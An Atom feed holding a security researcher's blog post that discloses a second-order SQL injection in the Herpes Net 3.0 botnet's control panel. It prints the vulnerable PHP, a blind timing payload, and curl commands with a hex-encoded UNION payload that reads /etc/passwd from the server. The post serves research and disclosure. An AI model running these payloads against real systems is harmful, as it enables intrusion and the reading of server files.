<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: sqli | bwall - Brian Wallace]]></title>
  <link href="https://bwall.github.io/blog/categories/sqli/atom.xml" rel="self"/>
  <link href="https://bwall.github.io/"/>
  <updated>2014-03-09T22:14:33-07:00</updated>
  <id>https://bwall.github.io/</id>
  <author>
    <name><![CDATA[Brian Wallace]]></name>
    <email><![CDATA[nightstrike9809@gmail.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Herpes Net 3.0 SQLi]]></title>
    <link href="https://bwall.github.io/blog/2014/03/09/herpes-net-3-dot-0-sqli/"/>
    <updated>2014-03-09T20:43:28-07:00</updated>
    <id>https://bwall.github.io/blog/2014/03/09/herpes-net-3-dot-0-sqli</id>
    <content type="html"><![CDATA[<p>During my talk at RSAC 2014, we announced multiple botnet vulnerabilities which had been discovered.  The following vulnerability is one of them.  Herpes Net is botnet with a wide range of functions, with everything from opening the CD tray to mining bitcoins (via plugins).  With a vulnerability in the command and control panel, we can get information on the botnet operator.</p>

<!-- more -->


<p>When this vulnerability was discovered by myself, I had thought it was a rediscovery of a <a href="https://code.google.com/p/malware-lu/wiki/en_analyse_herpnet">vulnerability</a> discovered by malware.lu.  Upon further investigation into their proof of concept, I found that the parameter they are injecting on no longer exists.  Instead of injecting on the &lsquo;id&rsquo; parameter, we can inject on the the &lsquo;hwid&rsquo; parameter.  The following is the vulnerable code (only relevant code displayed).</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Herpes Net 3.0 vulnerable code </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;&lt;</span><span class="nx">code</span><span class="o">&gt;</span><span class="nv">$hwid</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;hwid&#39;</span><span class="p">];</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nv">$header</span> <span class="o">==</span> <span class="s2">&quot;74978b6ecc6c19836a17a3c2cd0840b0&quot;</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nv">$hwid</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s2">&quot;&quot;</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="nv">$bottest</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM clients WHERE hwid = &#39;</span><span class="si">$hwid</span><span class="s2">&#39;&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$bottest</span><span class="p">))</span>
</span><span class='line'>        <span class="p">{</span><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];}</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$bottest</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span><span class="p">){</span>
</span><span class='line'>            <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM commands WHERE botid = &#39;</span><span class="si">$id</span><span class="s2">&#39; AND viewed = &#39;0&#39; LIMIT 1&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span>
</span><span class='line'>            <span class="p">{</span>
</span><span class='line'>                <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;|&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;variable&#39;</span><span class="p">];</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">code</span><span class="o">&gt;&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>A keen eye will notice that there are two vulnerable queries in this code selection.  The first query, while injectable, does not have a direct influence on output.  While blind SQL injection is not improbable, it does make for quite a bit more noise when trying to extract information.  Just for reference though, here is a proof of concept blind SQLi.
<code>
curl -A "74978b6ecc6c19836a17a3c2cd0840b0" -v http://c2.com/panels/herpes/run.php -d "hwid=' AND 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,BENCHMARK(10000, SLEEP(1000)) -- --"
</code>
This should sleep for quite a while if exploited successfully.  If only we can get a result from the database to print out, we could use a much simpler, faster and quieter exploit.  If we return a SQL injection payload from the first query, we can exploit the next one, and return data to be read.  Here is what we want in our second query&rsquo;s payload for a proof of concept.
<code>
' AND 1=2 UNION ALL SELECT 1,2,load_file('/etc/passwd'),4,5 -- --
</code>
In order to do that, we should hex encode it.
<code>
0x2720414e4420313d3220554e494f4e20414c4c2053454c45435420312c322c6c6f61645f66696c6528272f6574632f70617373776427292c342c35202d2d202d2d
</code>
And now our proof of concept looks like the following.
<code>
curl -A "74978b6ecc6c19836a17a3c2cd0840b0" -v http://c2.com/panels/herpes/run.php -d "hwid=' AND 1=2 UNION ALL SELECT 0x2720414e4420313d3220554e494f4e20414c4c2053454c45435420312c322c6c6f61645f66696c6528272f6574632f70617373776427292c342c35202d2d202d2d,2,3,4,5,6,7,8,9 -- --"
</code>
The data returned will be followed by &lsquo;|4&rsquo; as that is what is being returned in the &lsquo;variable&rsquo; row.  We can of course control this value as well if needed.</p>

<p><a href="https://github.com/bwall/BAMF/blob/master/IntegrationQueue/http/herpesnet/herpesnet.class.py">Here</a> is a proof of concept which uses this second order SQL injection to extract the bot information from the database.</p>
]]></content>
  </entry>
  
</feed>
